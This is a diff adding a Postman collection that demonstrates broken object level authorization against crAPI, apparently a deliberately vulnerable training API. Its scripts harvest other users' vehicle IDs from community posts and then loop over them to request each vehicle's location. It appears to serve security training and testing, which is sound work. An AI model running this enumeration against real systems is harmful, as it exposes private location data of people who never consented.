@@ -1,0 +1,121 @@
+{
+	"info": {
+		"_postman_id": "11aacf2c-57e1-44b1-9d22-f1e63ddb343b",
+		"name": "API01:2019 Broken Object Level Authorization",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "4150788"
+	},
+	"item": [
+		{
+			"name": "Get Vehicle IDs",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"let posts = pm.response.json()",
+							"let vehicleIds = []",
+							"",
+							"posts.forEach(function (post) {",
+							"    console.log(post.author.vehicleid)",
+							"    if (post.author.vehicleid != \"\") {",
+							"        vehicleIds.push(post.author.vehicleid)",
+							"        console.log(post.author.vehicleid)",
+							"    }",
+							"    if (post.comments.length > 0) {",
+							"        post.comments.forEach(function (comment) {",
+							"            if (comment.author.vehicleid != \"\") {",
+							"                vehicleIds.push(comment.author.vehicleid)",
+							"            }",
+							"        })",
+							"    }",
+							"})",
+							"",
+							"pm.globals.set('vehicleIds', vehicleIds)"
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Authorization",
+						"value": "Bearer {{token}}",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "{{crapi-web}}/community/api/v2/community/posts/recent",
+					"host": [
+						"{{crapi-web}}"
+					],
+					"path": [
+						"community",
+						"api",
+						"v2",
+						"community",
+						"posts",
+						"recent"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Access Vehicle Locations",
+			"event": [
+				{
+					"listen": "prerequest",
+					"script": {
+						"exec": [
+							"let vehicleIds = pm.globals.get('vehicleIds')",
+							"let vehicleId = vehicleIds.pop()",
+							"pm.globals.set('vehicleIds', vehicleIds)",
+							"pm.globals.set('vehicleId', vehicleId)"
+						],
+						"type": "text/javascript"
+					}
+				},
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"let vehicleIds = pm.globals.get('vehicleIds')",
+							"if (vehicleIds.length > 0) {",
+							"    postman.setNextRequest(pm.info.requestName)",
+							"}"
+						],
+						"type": "text/javascript"
+					}
+				}
+			],
+			"request": {
+				"method": "GET",
+				"header": [
+					{
+						"key": "Authorization",
+						"value": "Bearer {{token}}",
+						"type": "text"
+					}
+				],
+				"url": {
+					"raw": "{{crapi-web}}/identity/api/v2/vehicle/{{vehicleId}}/location",
+					"host": [
+						"{{crapi-web}}"
+					],
+					"path": [
+						"identity",
+						"api",
+						"v2",
+						"vehicle",
+						"{{vehicleId}}",
+						"location"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
